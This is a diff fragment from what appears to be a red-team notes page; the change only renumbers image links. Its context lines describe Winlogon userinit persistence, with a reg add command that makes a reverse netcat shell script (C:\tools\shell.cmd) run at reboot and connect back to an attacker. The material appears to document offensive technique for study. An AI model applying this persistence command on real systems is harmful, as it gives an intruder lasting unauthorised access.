@@ -34,11 +34,11 @@ Let's now add an additional item shell.cmd \(a simple reverse netcat shell\) to 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
 ```
 
-![](../../.gitbook/assets/image%20%28433%29.png)
+![](../../.gitbook/assets/image%20%28432%29.png)
 
 Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:
 
-![](../../.gitbook/assets/image%20%28346%29.png)
+![](../../.gitbook/assets/image%20%28345%29.png)
 
 ## References
 
